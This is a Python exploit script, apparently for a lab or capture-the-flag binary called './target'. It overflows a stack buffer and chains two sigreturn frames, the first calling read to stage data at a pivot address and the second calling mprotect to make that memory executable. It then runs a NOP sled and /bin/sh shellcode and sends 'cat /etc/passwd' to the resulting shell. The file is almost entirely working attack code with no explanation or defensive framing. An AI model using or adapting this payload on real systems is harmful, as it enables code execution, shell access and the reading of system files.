from util import *

from frame import SigreturnFrame

B = "./target"
def p32b(sym):
    return p32(nm(B, sym))

PIVOT = (nm(B, "__data_start") & 0xfffff000)
ADDR_SIGRET  = nm(B, "sigret") + 4
ADDR_SYSCALL = ADDR_SIGRET + 7

SYS_MPROTECT = 10
SYS_READ     = 0
SYS_WRITE    = 1
SYS_FSYNC    = 74

PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4

# ....  0096| 0x7fffffffd5a0 --> 0x0 
# ....  0104| 0x7fffffffd5a8 --> 0xffffffffffffffff 
# ....  0112| 0x7fffffffd5b0 --> 0x7fffffffdb08 --> 0xae200000000 
# (rbp) 0120| 0x7fffffffd5b8 --> 0x7fffffffdb10 --> 0x4006a0 (<__libc_csu_init>:        push   %r15)
# (rbx) 0128| 0x7fffffffd5c0 --> 0x0 
# (rdx) 0136| 0x7fffffffd5c8 --> 0x0 
# (rax) 0144| 0x7fffffffd5d0 --> 0xae2 
# (rcx) 0152| 0x7fffffffd5d8 --> 0x7ffff7aef490 (<wait+32>:     cmp    $0xfffffffffffff000,%rax)
# (esp) 0160| 0x7fffffffd5e0 --> 0x7fffffffdae8 --> 0x40067c (<main+66>:        mov    0x20046a(%rip),%eax        # 0x600aec <VAL>)
# (rip) 0168| 0x7fffffffd5e8 --> 0x7ffff7aef490 (<wait+32>:     cmp    $0xfffffffffffff000,%rax)

def get_payload_read():
    f = SigreturnFrame(arch="x64")

    f.set_regvalue("rax", SYS_READ)
    f.set_regvalue("rdi", 0)
    f.set_regvalue("rsi", PIVOT)
    f.set_regvalue("rdx", 0x1000)
    f.set_regvalue("rip", ADDR_SYSCALL)
    f.set_regvalue("rsp", PIVOT)
    
    return "A" * (0x3f0) + "BBBBBBBB" \
        + p64(ADDR_SIGRET) \
        + f.get_frame() + "\n"

def get_payload_mprotect():
    f = SigreturnFrame(arch="x64")
    f.set_regvalue("rax", SYS_MPROTECT)
    f.set_regvalue("rdi", PIVOT)
    f.set_regvalue("rsi", 0x100)
    f.set_regvalue("rdx", PROT_WRITE|PROT_READ|PROT_EXEC)
    f.set_regvalue("rip", ADDR_SYSCALL)
    f.set_regvalue("rsp", PIVOT+0x100)
    
    return p64(ADDR_SIGRET) \
        + f.get_frame() \
        + p64(PIVOT+0x160) \
        + "\x90" * 0x100 + SHELLCODE64_BINSH + "\n"

if __name__ == '__main__':
    p = sp.Popen(B, stdin=sp.PIPE, stdout=sp.PIPE)
    p.stdin.write(get_payload_read())
    p.stdin.write(get_payload_mprotect())

    p.stdin.write("cat /etc/passwd;exit;\n")
    while True:
        l = p.stdout.readline().strip()
        print(l)
        if l == "":
            break
